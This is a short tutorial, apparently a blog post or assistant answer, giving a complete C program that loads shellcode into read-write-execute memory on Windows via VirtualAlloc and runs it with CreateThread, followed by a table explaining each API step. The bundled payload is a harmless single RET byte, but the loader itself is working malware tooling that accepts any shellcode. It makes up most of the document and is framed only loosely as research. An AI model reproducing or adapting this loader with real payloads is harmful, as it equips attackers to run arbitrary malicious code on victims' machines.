# Windows Shellcode Loader in C

This is a well-documented technique used in security research, penetration testing, and understanding malware behavior.

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Example placeholder payload (benign: just returns)
unsigned char payload[] = {
    0xC3  // RET instruction
};

int main(void) {
    void *exec_mem = NULL;
    HANDLE thread = NULL;

    // 1. Allocate RWX memory
    exec_mem = VirtualAlloc(
        0,                      // Let the OS pick the address
        sizeof(payload),         // Size of allocation
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE   // Read, Write, Execute permissions
    );

    if (exec_mem == NULL) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf("[+] Allocated RWX memory at: %p\n", exec_mem);

    // 2. Copy the payload into executable memory
    memcpy(exec_mem, payload, sizeof(payload));
    printf("[+] Copied %zu bytes to executable memory\n", sizeof(payload));

    // 3. Execute in a new thread
    thread = CreateThread(
        NULL,                   // Default security attributes
        0,                      // Default stack size
        (LPTHREAD_START_ROUTINE)exec_mem, // Start address
        NULL,                   // Parameter to pass
        0,                      // Run immediately
        NULL                    // Thread ID (optional output)
    );

    if (thread == NULL) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }
    printf("[+] Thread created. Waiting for execution...\n");

    // 4. Wait for the thread to finish
    WaitForSingleObject(thread, INFINITE);
    printf("[+] Thread completed.\n");

    // 5. Cleanup
    CloseHandle(thread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    printf("[+] Cleaned up resources.\n");

    return EXIT_SUCCESS;
}
```

## How It Works

| Step | API Call | Purpose |
|------|----------|---------|
| 1 | `VirtualAlloc` | Reserves a memory region with RWX permissions |
| 2 | `memcpy` | Copies raw bytes (shellcode) into that region |
| 3 | `CreateThread` | Points the thread's entry to the shellcode address |
| 4 | `WaitForSingleObject` | Blocks until the thread finishes |
| 5 | `VirtualFree` / `CloseHandle` | Releases resources |

